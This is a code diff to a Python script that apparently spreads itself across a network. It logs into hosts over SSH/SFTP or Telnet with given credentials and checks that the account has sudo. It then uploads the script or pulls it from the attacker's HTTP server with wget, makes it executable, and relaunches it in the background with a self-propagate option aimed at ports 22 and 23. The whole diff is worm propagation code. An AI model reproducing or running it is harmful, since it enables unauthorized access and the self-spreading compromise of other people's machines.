@@ -231,6 +231,15 @@ def transfer_file_with_sftp(ip, username, password, target_directory, self_propa
 
                 sftp_client.put(localpath=local_script_path, remotepath=target_script_path)
 
+                channel = client.invoke_shell()
+
+                sudo_check = "id\n"
+                sudo_check_response = encode_in_ascii("27(sudo)")
+
+                sudo = send_command_over_channel(channel, command=sudo_check, check_output=True, output=sudo_check_response)
+                if not sudo:
+                    return False
+
                 commands = [
                     "cd %s\n" % target_directory,
                     "sudo -S chmod +x %s\n" % script_filename,
@@ -238,21 +247,8 @@ def transfer_file_with_sftp(ip, username, password, target_directory, self_propa
                     "sudo nohup ./%s -u %s -p 22,23 -f %s -L -P >/dev/null 2>&1 &\n" % (script_filename, username, deployment_filename)
                 ]
 
-                channel = client.invoke_shell()
-
                 for command in commands:
-                    channel.send(command)
-
-                    counter = 0
-                    while not channel.recv_ready():
-                        if counter >= 5:
-                            return False
-
-                        time.sleep(0.1)
-                        counter = counter + 1
-
-                    channel.recv(1024)
-                    time.sleep(0.1)
+                    send_command_over_channel(channel, command)
 
                 channel.close()
 
@@ -262,6 +258,25 @@ def transfer_file_with_sftp(ip, username, password, target_directory, self_propa
         return False
     finally:
         client.close()
+
+
+def send_command_over_channel(channel, command, check_output=False, output=None):
+    channel.send(command)
+
+    counter = 0
+    while not channel.recv_ready():
+        if counter >= 5:
+            return False
+
+        time.sleep(0.1)
+        counter = counter + 1
+
+    command_response = channel.recv(1024)
+    if check_output and output not in command_response:
+        return False
+
+    time.sleep(0.1)
+    return True
 
 
 def transfer_file_with_http_server(ip, username, password, target_directory, self_propagate, deployment_filename,
@@ -298,7 +313,7 @@ def transfer_file_with_http_server(ip, username, password, target_directory, sel
     wget_script_file_command = encode_in_ascii(
          wget_if_not_exists_command % (script_filename, server_ip, port_number, script_filename))
 
-    chmod_command = encode_in_ascii("sudo chmod +x %s\n" % script_filename)
+    chmod_command = encode_in_ascii("sudo -S chmod +x %s\n" % script_filename)
     sudo_prompt = encode_in_ascii("[sudo] password for %s:" % username)
 
     start_net_attack_command = encode_in_ascii(
@@ -307,41 +322,37 @@ def transfer_file_with_http_server(ip, username, password, target_directory, sel
     wait_for = encode_in_ascii("WAIT FOR")
 
     connection = Telnet(ip, port=telnet_port)
-    try:
-        connection.read_until(login_prompt)
-        connection.write(username_input)
-        connection.read_until(password_prompt)
-        connection.write(password_input)
-        banner = connection.read_until(welcome_output, timeout=1)
-        if welcome_output not in banner:
-            return False
-
-        connection.write(sudo_check)
-        check = connection.read_until(sudo_check_response, timeout=1)
-        if sudo_check_response not in check:
-            return False
-
-        connection.write(cd_command)
-        if not self_propagate:
-            connection.write(remove_deploy_if_exists_command)
-        connection.write(wget_deployment_file_command)
-
-        if self_propagate:
-            connection.write(wget_script_file_command)
-            connection.read_until(saved, timeout=1)
-
-            connection.write(chmod_command)
-            sudo_response = connection.read_until(sudo_prompt, timeout=1)
-            if sudo_prompt in sudo_response:
-                connection.write(password_input)
-                connection.read_until(wait_for, timeout=1)
-            connection.write(start_net_attack_command)
-
-        connection.read_until(wait_for, timeout=1)
-    except Exception as ex:
+    connection.read_until(login_prompt)
+    connection.write(username_input)
+    connection.read_until(password_prompt)
+    connection.write(password_input)
+    banner = connection.read_until(welcome_output, timeout=1)
+    if welcome_output not in banner:
         return False
-    finally:
-        connection.close()
+
+    connection.write(sudo_check)
+    check = connection.read_until(sudo_check_response, timeout=1)
+    if sudo_check_response not in check:
+        return False
+
+    connection.write(cd_command)
+    if not self_propagate:
+        connection.write(remove_deploy_if_exists_command)
+    connection.write(wget_deployment_file_command)
+
+    if self_propagate:
+        connection.write(wget_script_file_command)
+        connection.read_until(saved, timeout=1)
+
+        connection.write(chmod_command)
+        sudo_response = connection.read_until(sudo_prompt, timeout=1)
+        if sudo_prompt in sudo_response:
+            connection.write(password_input)
+            connection.read_until(wait_for, timeout=1)
+        connection.write(start_net_attack_command)
+
+    connection.read_until(wait_for, timeout=1)
+    connection.close()
 
     return True
 
